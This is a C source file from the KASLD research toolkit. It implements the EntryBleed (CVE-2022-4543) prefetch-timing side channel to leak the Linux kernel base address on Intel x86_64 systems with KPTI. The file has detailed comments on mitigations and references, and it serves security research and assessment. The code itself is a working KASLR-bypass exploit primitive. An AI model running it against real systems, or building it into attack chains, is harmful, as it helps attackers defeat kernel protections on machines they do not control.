// This file is part of KASLD - https://github.com/bcoles/kasld
//
// EntryBleed (CVE-2022-4543) prefetch side-channel address leak.
//
// Recovers the kernel-text base under KPTI by timing prefetch of candidate
// addresses for entry_SYSCALL_64: it sits at a build-specific static offset
// from the base (stable even under FG-KASLR), and the per-build offset table
// below converts the leaked page into the base.
//
// EntryBleed is a KPTI-specific bypass (Intel; AMD never enables KPTI, so it is
// not affected). Under KPTI the user page tables expose only the entry
// trampoline, so entry_SYSCALL_64 stands out as the one leakable kernel page
// and the base is pinned reliably. v6.2 (97e3d26b) randomizes the per-cpu entry
// area to blunt it, but distro versions do not track mainline so there is no
// clean version boundary, and it is won't-fix upstream and by distros.
//
// Without KPTI the whole kernel is user-mapped, so no single page stands out
// and the technique does not apply: the component declines. Recovering a
// KPTI-off base is the job of a general prefetch page-table scan (the mapped
// left edge), which the paper defers to and KASLD ships separately. The
// prefetch channel must also be live: some CPUs neutralise it in microcode (the
// timing goes flat) and a hypervisor can flatten it too.
//
// Per-cpu entry-area randomization (mitigates the KPTI path only) landed in
// ~v6.2 on 2022-12-16:
// https://github.com/torvalds/linux/commit/97e3d26b5e5f371b3ee223d94dd123e6c442ba80
//
// Based on proof of concept code by Will:
// https://www.willsroot.io/2022/12/entrybleed.html
//
// Analyzed and formalized in:
// "EntryBleed: A Universal KASLR Bypass against KPTI on Linux"
// (William Liu, Joseph Ravichandran, Mengjia Yan, HASP 2023)
//
// Leak primitive:
//   Data leaked:      kernel text virtual base (via entry_SYSCALL_64)
//   Kernel subsystem: arch/x86 — CPU prefetch timing side-channel
//   Data structure:   entry_SYSCALL_64 (the KPTI entry trampoline)
//   Address type:     virtual (kernel text, page-aligned)
//   Method:           timing (prefetch side-channel)
//   CVE:              CVE-2022-4543
//   Patched:          v6.2 (97e3d26b); won't-fix upstream and by distros
//   Access check:     N/A (hardware side-channel — no kernel gate)
//   Source:           N/A (hardware side-channel)
//
// Mitigations:
//   v6.2 (97e3d26b) randomizes the per-cpu entry area, blunting the leak. AMD
//   is not affected (it never enables KPTI). Some CPUs neutralise the prefetch
//   channel in microcode (the signal goes flat). Treated as won't-fix upstream
//   and by distros (KASLR is not held to resist local attacks), so there is no
//   reliable per-version boundary; the component probes and self-detects
//   instead.
//
// References:
// https://gruss.cc/files/prefetch.pdf
// https://www.openwall.com/lists/oss-security/2022/12/16/3
// https://www.willsroot.io/2022/12/entrybleed.html
// https://dl.acm.org/doi/pdf/10.1145/3623652.3623669
// https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html
// https://bugs.chromium.org/p/project-zero/issues/detail?id=2351
//
// Debugging:
//   -v / KASLD_VERBOSE        the CPU/KPTI posture and the recovered base.
//   KASLD_ENTRYBLEED_DEBUG=1  the mean cycle count of every probed slot, for
//                             each offset tried, with the minimum marked. The
//                             winner alone cannot show whether it stood clear
//                             of the noise or merely happened to be lowest.
//
// KASLD_BUILD_NO_OPTIMIZE: built -O0 (Makefile) so the optimizer cannot reorder
// or elide the timing / cache-probe / speculation measurements this technique
// relies on; a per-function no-opt attribute is not a reliable substitute.
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include "include/kasld/hash.h"
#include "include/sidechannel.h"
#include <stdlib.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "EntryBleed (CVE-2022-4543): a KPTI-specific KASLR bypass on x86_64. "
    "Under KPTI the user page tables expose only the entry_SYSCALL_64 "
    "trampoline, so timing prefetch across candidate addresses reveals "
    "that one uniquely-mapped page and pins the base. Without KPTI the "
    "whole kernel is mapped and no page stands out, so the component "
    "declines and leaves KPTI-off bases to a general prefetch scan. v6.2 "
    "randomizes the entry area to blunt it; some CPUs neutralise the "
    "channel in microcode.");

KASLD_META("method:timing\n"
           "phase:probing\n"
           "live:1\n"
           "discloses:virtual\n"
           "cve:CVE-2022-4543\n"
           "patch:v6.2\n"
           "hardware:prefetch side-channel\n");

struct kernel_info {
  uint64_t uname_hash; /* FNV-1a-64 of the trimmed "<release> <version>" */
  uint32_t
      entry_syscall_64; /* page-aligned offset from _text to entry_SYSCALL_64 */
};

/* Per-build entry_SYSCALL_64 offsets keyed on an FNV-1a-64 hash of the full
 * uname "<release> <version>" (same keying as qemu_tcg_iret /
 * bpf_verifier_ksym); the readable uname stays as a trailing // comment.
 *
 * Presence here is NOT an assertion that a listed build is exploitable.
 * EntryBleed is treated as won't-fix by upstream and the major distros (Red
 * Hat: kernel "Affected"; Debian: every suite marked vulnerable, "KASLR is not
 * expected to be resistant to local attacks"). The v6.2 mitigation (97e3d26b,
 * per-cpu entry-area randomization) blunts the leak on >= 6.2, but distro
 * kernel versions do not track mainline (e.g. an Ubuntu 6.8 build is not
 * mainline 6.8, let alone 6.2), so a listed build may be fully vulnerable or
 * effectively patched -- the version alone cannot say. The runtime probe
 * self-detects: where the offset no longer resolves the base no base wins a
 * majority across passes and the component declines, so an over-inclusive row
 * is inert (the entry area was randomized away, the CPU does not expose it, or
 * the channel is microcode-flat). */
// offsets must be page aligned
#ifdef __has_include
#if !__has_include("offsets/entrybleed.inc")
#error "offsets/entrybleed.inc missing — regenerate the offset table"
#endif
#endif
#include "offsets/entrybleed.inc"
#ifndef KASLD_OFFSETS_PRESENT
#error "offsets/entrybleed.inc did not define the table — regenerate it"
#endif
#undef KASLD_OFFSETS_PRESENT

static struct utsname get_kernel_version(void) {
  struct utsname u;
  int rv = kasld_uname(&u);
  if (rv != 0) {
    kasld_err("kasld_uname()");
    exit(KASLD_EXIT_UNAVAILABLE);
  }
  return u;
}

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#define KERNEL_VERSION_SIZE_BUFFER 512

static int detect_kernel_version(void) {
  struct utsname u;
  char kernel_version[KERNEL_VERSION_SIZE_BUFFER];

  u = get_kernel_version();

  if (strstr(u.machine, "64") == NULL) {
    kasld_err("system is not using a 64-bit kernel");
    exit(kasld_disp_absent("not a 64-bit kernel"));
  }

  kasld_uname_fingerprint(kernel_version, KERNEL_VERSION_SIZE_BUFFER, &u);
  uint64_t h = kasld_fnv1a64(kernel_version);

  unsigned long i;
  for (i = 0; i < ARRAY_SIZE(offsets); i++) {
    if (offsets[i].uname_hash == h) {
      kasld_info("kernel version '%s' detected", kernel_version);
      return i;
    }
  }

  kasld_err("kernel version '%s' not recognized", kernel_version);
  kasld_disposition(DISP_INCONCLUSIVE, NULL,
                    "no offsets for this kernel build");
  return -1;
}

#define STEP 0x100000ul
#define ARR_SIZE                                                               \
  (unsigned long)((KERNEL_VIRT_TEXT_MAX - KERNEL_VIRT_TEXT_MIN) / STEP)

/* Passes for the majority vote over leak_syscall_entry(). A vulnerable system
 * agrees on the base across most passes; an odd budget lets a clear majority
 * form while an occasional noisy pass is outvoted rather than failing the
 * probe. */
#define EB_VOTE_PASSES 7

static int debug_mode; /* KASLD_ENTRYBLEED_DEBUG: the whole slot profile */

static uint64_t leak_syscall_entry(uint64_t offset) {
  uint64_t data[ARR_SIZE] = {0};
  uint64_t min = ~0, addr = ~0;
  uint64_t SCAN_START = KERNEL_VIRT_TEXT_MIN + offset;

  int iterations = 100;
  int dummy_iterations = 5;
  int i;
  for (i = 0; i < iterations + dummy_iterations; i++) {
    uint64_t idx;
    for (idx = 0; idx < ARR_SIZE; idx++) {
      uint64_t test = SCAN_START + idx * STEP;
      syscall(104);
      uint64_t time = time_prefetch(test);
      if (i >= dummy_iterations)
        data[idx] += time;
    }
  }

  unsigned long index;
  for (index = 0; index < ARR_SIZE; index++) {
    data[index] /= iterations;
    if (data[index] < min) {
      min = data[index];
      addr = SCAN_START + index * STEP;
    }
  }

  /* The whole profile, not just the winner. The technique picks the cheapest
   * slot, so a wrong answer looks identical to a right one from the winner
   * alone -- what separates them is whether the minimum stands clear of the
   * rest or sits inside the noise, which needs every slot to see. */
  if (debug_mode) {
    fprintf(stderr, "# entrybleed offset 0x%lx: mean cycles per slot\n",
            (unsigned long)offset);
    for (index = 0; index < ARR_SIZE; index++) {
      unsigned long slot = (unsigned long)(SCAN_START + index * STEP);
      fprintf(stderr, "#   0x%lx %lu%s\n", slot, (unsigned long)data[index],
              slot == (unsigned long)addr ? "  <- min" : "");
    }
  }

  if (kasld_addr_is_kernel_text(addr))
    return addr - offset;

  return 0;
}

static unsigned long get_kernel_addr_entrybleed(void) {
  int cpu = detect_cpu_vendor();

  if (cpu == CPU_VENDOR_UNKNOWN) {
    kasld_err("Unknown CPU vendor");
    exit(kasld_disp_absent("unknown CPU vendor"));
  }

  bool pti = detect_kpti();

  kasld_info("%s CPU with KPTI %s", (cpu == CPU_VENDOR_AMD ? "AMD" : "Intel"),
             (pti ? "enabled" : "disabled"));

  // EntryBleed is a KPTI-specific bypass: it relies on the entry trampoline
  // being the one kernel page KPTI leaves mapped in the user page tables.
  // Without KPTI the whole kernel is user-mapped, no single page stands out,
  // and the scan locks onto the mapped region's left edge and reports a base an
  // offset too low. Recovering a KPTI-off base is the general prefetch scan's
  // job, so decline rather than emit a systematically wrong base.
  if (!pti) {
    kasld_err("no KPTI: EntryBleed does not apply; the general prefetch scan "
              "recovers KPTI-off bases");
    exit(kasld_disp_absent("no KPTI: EntryBleed's entry-page exposure requires "
                           "KPTI; the general prefetch scan recovers KPTI-off "
                           "bases"));
  }

  // AMD was never Meltdown-vulnerable and so never enables KPTI; reaching here
  // on AMD is a forced configuration the technique is not known to work on.
  if (cpu == CPU_VENDOR_AMD) {
    kasld_err("AMD with KPTI is not affected by EntryBleed");
    exit(kasld_disp_mitigation("kpti", "AMD with KPTI (not affected)"));
  }

  int kernel = detect_kernel_version();

  if (kernel == -1)
    return 0;

  uint64_t offset = offsets[kernel].entry_syscall_64;

  // Take the majority base over several passes rather than requiring every pass
  // to agree: a vulnerable system returns the same base on most passes, so an
  // occasional noisy pass is outvoted instead of failing the whole probe. Only
  // an unstable result -- no base wins a majority -- counts as no signal.
  unsigned long votes[EB_VOTE_PASSES];
  int npass, i;
  for (npass = 0; npass < EB_VOTE_PASSES; npass++) {
    votes[npass] = leak_syscall_entry(offset);
    // Stop as soon as one base holds an unbeatable majority of the budget (the
    // remaining passes cannot overturn it): a clean signal pays only the passes
    // it takes to corroborate, and a lone false cluster never reaches it.
    if (kasld_addr_is_kernel_text(votes[npass])) {
      int agree = 0;
      for (i = 0; i <= npass; i++)
        if (votes[i] == votes[npass])
          agree++;
      if (agree > EB_VOTE_PASSES / 2)
        return votes[npass];
    }
  }

  // No base won a majority: the entry area was randomized away (>= v6.2), the
  // CPU does not expose the entry page, the channel is microcode-flat, or the
  // run was simply too noisy -- indistinguishable here.
  kasld_err("no majority base across passes; not confirmed here");
  kasld_disposition(
      DISP_INCONCLUSIVE, NULL,
      "no majority base under KPTI: patched (>= v6.2 entry-area "
      "randomization), the CPU does not expose the entry page, or "
      "too noisy to confirm");
  return 0;
}

int main(void) {
  if (kasld_skip_live_probe("entrybleed"))
    return 0;

  debug_mode = kasld_env_enabled("KASLD_ENTRYBLEED_DEBUG");
  kasld_info("trying EntryBleed (CVE-2022-4543) ...");

  unsigned long addr = get_kernel_addr_entrybleed();
  if (!addr) {
    kasld_err("EntryBleed (CVE-2022-4543): kernel base not recovered");
    return 0;
  }

  kasld_info("possible kernel base: %lx", addr);
  /* addr is the image base (_text): the KPTI leak pins entry_SYSCALL_64
   * exactly. Emit an image-base pin at REGION_KERNEL_IMAGE (not KERNEL_TEXT,
   * which is read as _stext and offset by the head gap). CONF_TIMING is the
   * weakest pin: a parsed base overrides it, an agreeing one corroborates. */
  kasld_result_base(KASLD_TYPE_VIRT, REGION_KERNEL_IMAGE, addr, NULL,
                    CONF_TIMING);

  return 0;
}
